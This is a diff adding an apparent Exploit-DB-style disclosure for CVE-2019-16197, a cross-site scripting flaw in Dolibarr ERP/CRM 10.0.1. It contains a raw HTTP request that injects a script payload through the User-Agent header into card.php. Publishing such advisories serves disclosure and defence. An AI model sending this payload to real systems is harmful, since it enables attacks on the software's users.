@@ -1,0 +1,20 @@
+# Exploit Title: Dolibarr ERP/CRM 10.0.1 - User-Agent Http Header Cross
+Site Scripting
+# Exploit Author: Metin Yunus Kandemir (kandemir)
+# Vendor Homepage: https://www.dolibarr.org/
+# Software Link: https://www.dolibarr.org/downloads
+# Version: 10.0.1
+# Category: Webapps
+# Tested on: Xampp for Linux
+# CVE: CVE-2019-16197
+# Software Description : Dolibarr ERP & CRM is a modern and easy to use
+software package to manage your business...
+==================================================================
+
+Description: In htdocs/societe/card.php in Dolibarr 10.0.1, the value of
+the User-Agent HTTP header is copied into the HTML document as plain text
+between tags, leading to XSS.
+
+GET /dolibarr-10.0.1/htdocs/societe/card.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0ab<script>alert("XSS")</script>
